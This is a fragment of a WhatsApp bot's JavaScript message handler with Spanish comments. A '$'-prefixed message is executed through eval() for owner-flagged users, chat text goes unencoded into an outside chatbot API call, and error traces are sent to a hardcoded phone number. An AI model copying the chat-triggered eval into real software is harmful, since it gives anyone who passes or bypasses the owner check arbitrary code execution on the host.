				if (budy.startsWith('$')) {
					if (!Matt_M && !autonomo && !isTeslaUser) return
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await teslagod.sendMessage(from, evaled, MessageType.text, {
						sendEphemeral: true,
						quoted: fakemek
					}).catch(e => {
						m = String(e)
						console.log(m)
						reply(m)
					})
				}
				//
				if (isSimi && !autonomo && body != undefined) {
					if (OnOffLine === true) return
					if (budy.startsWith(prefix)) return
					try {
						var ressimi = await fetchJson(`https://latam-api.vercel.app/api/simisimi?apikey=${MyApiKey}&idioma=es&chat=${budy}`)
					} catch (e) {
						reply(`Sin respuesta T~T`)
					}
					reply(ressimi.respuesta)
				}
			}
		} catch (err) {
			e = String(err); // Errores comunes en consola
			f = util.format(err) // 
			if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
				teslagod.sendMessage(`51995386439@s.whatsapp.net`, `[ ! ] Se detecto un error en el bot \n\n${monospace}${f}${monospace}`, MessageType.text)
			}
			//console.log(err)
		}
	})
}
starts()